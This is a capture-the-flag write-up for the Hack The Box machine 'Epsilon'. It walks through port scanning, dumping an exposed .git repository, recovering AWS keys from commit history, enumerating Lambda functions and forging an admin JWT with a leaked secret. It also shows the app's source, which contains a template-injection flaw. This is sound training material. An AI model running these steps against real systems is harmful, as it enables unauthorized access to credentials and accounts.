---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags:  
---

<br />

![1](../../../assets/images/Epsilon/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Introduction:

<br />



<br />

# Enumeration:

<br />

As always we are going to start with a `nmap` scan to enumerate the open ports and services running on the victim machine:

<br />

```bash
❯ nmap -p- 10.10.11.134 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 12:29 CEST
Nmap scan report for 10.10.11.134
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-server-header: Apache/2.4.41 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.86 seconds
```

<br />

Open Ports:

`Port 22` -> ssh 

`Port 80` -> http 

`Port 5000` -> http

<br />

# Http Enumeration: -> Port 5000

<br />

If we browse the website on the port 5000, we're presented with a login panel:

<br />

![3](../../../assets/images/Epsilon/3.png)

<br />

We tried default credentials such as `admin:admin` and basic SQL Injection trying to bypass the login, but without success.

<br />

# Http Enumeration: -> Port 80

<br />

There is a website running on the port 80, but attempting to access it returns a `403 forbidden` status code:

<br />

![2](../../../assets/images/Epsilon/2.png)

<br />

## .git exposed:

<br />

At first glance, it seems there isn't much we can do here.

However, upon analyzing the `nmap` output, we notice the presence of a `.git` directory on the web server.

Using the popular tool [git-dumper](https://github.com/arthaud/git-dumper), we can retrieve the repository with the following oneliner:

<br />

```bash
❯ python3 git_dumper.py http://10.10.11.134/.git EPSILON
```

<br />

Now, we can explore the directory and inspect the contents of the dumped `.git` repository:

<br />

```bash
❯ ls -la
drwxr-xr-x root root  64 B  Sat May 24 12:44:24 2025  .
drwxr-xr-x root root 196 B  Sat May 24 12:44:21 2025  ..
drwxr-xr-x root root 146 B  Sat May 24 12:45:34 2025  .git
.rw-r--r-- root root 1.6 KB Sat May 24 12:44:24 2025  server.py
.rw-r--r-- root root 1.1 KB Sat May 24 12:44:24 2025  track_api_CR_148.py
```

<br />

As we can see, there are some interesting Python scripts along with the usual `.git` directory.

To better understand everything, we will analyze both of them.

<br />

### server.py:

<br />

This script appears to be the source code of the website running on port 5000.

There are different functionalities with their own paths.

The first one is a function named `verify_jwt`, which is used to validate the admin's identity:

<br />

```python
secret = '<secret_key>'

def verify_jwt(token,key):
    try:
        username=jwt.decode(token,key,algorithms=['HS256',])['username']
        if username:
            return True
        else:
            return False
    except:
        return False
```

<br />

After that function, we have another one named `index`:

<br />

```python
@app.route("/", methods=["GET","POST"])
def index():
    if request.method=="POST":
        if request.form['username']=="admin" and request.form['password']=="admin":
            res = make_response()
            username=request.form['username']
            token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
            res.set_cookie("auth",token)
            res.headers['location']='/home'
            return res,302
        else:
            return render_template('index.html')
    else:
        return render_template('index.html')
```

<br />

In this function, we can see that the `admin:admin` credentials should work, but as we saw earlier, they didn't.

The `home` function renders the homepage after verifying the admin's `JWT` using the `verify_jwt` function.

<br />

```python
@app.route("/home")
def home():
    if verify_jwt(request.cookies.get('auth'),secret):
        return render_template('home.html')
    else:
        return redirect('/',code=302)
```

<br />

The `/track` route only implements auth verification for the POST request, but not for the GET one.

<br />

```python
@app.route("/track",methods=["GET","POST"])
def track():
    if request.method=="POST":
        if verify_jwt(request.cookies.get('auth'),secret):
            return render_template('track.html',message=True)
        else:
            return redirect('/',code=302)
    else:
        return render_template('track.html')
```

<br />

Finally, we have the `order` function.

This is the most interesting part, as it uses `user input` without any sanitization and renders it directly in a `template`.

This likely introduces an `SSTI` (Server Side Template Injection) vulnerability.

<br />

```python
@app.route('/order',methods=["GET","POST"])
def order():
    if verify_jwt(request.cookies.get('auth'),secret):
        if request.method=="POST":
            costume=request.form["costume"]
            message = '''
            Your order of "{}" has been placed successfully.
            '''.format(costume)
            tmpl=render_template_string(message,costume=costume)
            return render_template('order.html',message=tmpl)
        else:
            return render_template('order.html')
    else:
        return redirect('/',code=302)
```

<br />

### track_api_CR_148.py:

<br />

In the other script, we found what seems to be an `AWS` (Amazon Web Services) instance.

<br />

```python
import io
import os
from zipfile import ZipFile
from boto3.session import Session


session = Session(
    aws_access_key_id='<aws_access_key_id>',
    aws_secret_access_key='<aws_secret_access_key>',
    region_name='us-east-1',
    endpoint_url='http://cloud.epsilon.htb')
aws_lambda = session.client('lambda')


def files_to_zip(path):
    for root, dirs, files in os.walk(path):
        for f in files:
            full_path = os.path.join(root, f)
            archive_name = full_path[len(path) + len(os.sep):]
            yield full_path, archive_name


def make_zip_file_bytes(path):
    buf = io.BytesIO()
    with ZipFile(buf, 'w') as z:
        for full_path, archive_name in files_to_zip(path=path):
            z.write(full_path, archive_name)
    return buf.getvalue()


def update_lambda(lambda_name, lambda_code_path):
    if not os.path.isdir(lambda_code_path):
        raise ValueError('Lambda directory does not exist: {0}'.format(lambda_code_path))
    aws_lambda.update_function_code(
        FunctionName=lambda_name,
        ZipFile=make_zip_file_bytes(path=lambda_code_path))
```

<br />

Most of the important information, such as the `AWS` credentials, is removed.

We can only take note of the `cloud.epsilon.htb` subdomain and add it to our `/etc/hosts` file.

<br />

## Analyzing Commits:

<br />

At this point, we can analyze the past commits of the dumped repository trying to find some information leakage.

The `git log` command shows 4 different commits:

<br />

```bash
❯ git log
commit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -> master)
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module

```

<br />

Let's inspect the first commit added to the repository:

<br />

```bash
❯ git show 7cf92a7a09e523c1c667d13847c9ba22464412f3
commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
new file mode 100644
index 0000000..fed7ab9
--- /dev/null
+++ b/track_api_CR_148.py
@@ -0,0 +1,36 @@
+import io
+import os
+from zipfile import ZipFile
+from boto3.session import Session
+
+
+session = Session(
+    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
+    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+    region_name='us-east-1',
+    endpoint_url='http://cloud.epsilong.htb')
+aws_lambda = session.client('lambda')    
+
+
+def files_to_zip(path):
+    for root, dirs, files in os.walk(path):
+        for f in files:
+            full_path = os.path.join(root, f)
+            archive_name = full_path[len(path) + len(os.sep):]
+            yield full_path, archive_name
+
+
```

<br />

Great! We discovered `AWS` credentials in the output.

We can set them using the `aws configure` command to interact with `cloud.epsilon.htb` subdomain:

<br />

### AWS Enumeration:

<br />

```bash 
❯ aws configure
AWS Access Key ID [****************test]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [****************test]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [us-east-1]:        
Default output format [test]: json
```

<br />

The first thing we try is to enumerate `AWS` buckets.

<br />

```bash 
❯ aws s3 ls s3:// --endpoint-url http://cloud.epsilon.htb

An error occurred (400) when calling the ListBuckets operation: Bad Request
```

<br />

Unfortunately, the request returned a `400 Bad Request` error.

If we recall, there was something related to `lambda` in the `track_api_CR_148.py` source code.

Running `aws help` we can see that it's a lambda option in the output, and if we run a `aws lambda help` we see an interesting flag, `list-functions`, which enumerates available Lambda functions:

<br />

```bash 
❯ aws lambda list-functions --endpoint-url http://cloud.epsilon.htb
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2025-05-24T10:30:13.205+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "436a4229-7c8b-4584-85a0-63bbcb657b2f",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```

<br />

One available function is named `"costume_shop_v1"`.

Using `get-function` along with the `--function-name` option, we can retrieve more detailed information about it:

<br />

```bash
❯ aws lambda get-function --function-name=costume_shop_v1 --endpoint-url http://cloud.epsilon.htb
{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2025-05-24T10:30:13.205+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "436a4229-7c8b-4584-85a0-63bbcb657b2f",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}
```

<br />

There is an `URL` that points to a source.

We can download this file using `wget`:

<br />

```bash 
❯ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
--2025-05-24 14:58:30--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
Resolviendo cloud.epsilon.htb (cloud.epsilon.htb)... 10.10.11.134
Conectando con cloud.epsilon.htb (cloud.epsilon.htb)[10.10.11.134]:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 
Longitud: 478 [application/zip]
Grabando a: «code»

code                                          100%[================================================================================================>]     478  --.-KB/s    en 0s      

2025-05-24 14:58:30 (44,0 MB/s) - «code» guardado [478/478]
```

<br />

The downloaded file is a `ZIP` archive:

<br />

```bash
❯ file code
code: Zip archive data, at least v2.0 to extract, compression method=deflate
```

<br />

After unzipping it, we find a Python script named `"lambda_function.py"`.

<br />

```bash
❯ unzip code
Archive:  code
  inflating: lambda_function.py
```

<br />

### lambda_function.py:

<br />

The code is not particularly relevant, it only contains a hardcoded `secret`:

<br />

```python
import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
```

<br />

## Costume Login Bypass:

<br />

If we recall, some functions in `server.py`, were using a JWT generated with the following line:

<br />

```python
token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
```

<br />

In this line, the script is creating an `admin` token with a secret.

Maybe we can use the discovered `secret` to create this `token`.

To test this, I used this simple Python 3 script:

<br />

```python
#!/usr/bin/env python3

from termcolor import colored
import jwt

secret = "RrXCv`mrNe!K!4+5`wYq"

token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
print(colored(f"\n[+] Here you have your admin token to log into the web application -> {token}\n", "red"))
```

<br />

If we run it, we will obtain the admin token:

<br />

```bash
[+] Here you have your admin token to log into the web application -> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4
```

<br />

Now, we can set the `token` using the browser's `DevTools` to bypass the login mechanism:

<br />

![4](../../../assets/images/Epsilon/4.png)

<br />

With the valid `JWT` token in place, we are now authenticated as the `admin` user and can access restricted areas of the application.

<br />

![5](../../../assets/images/Epsilon/5.png)

<br />

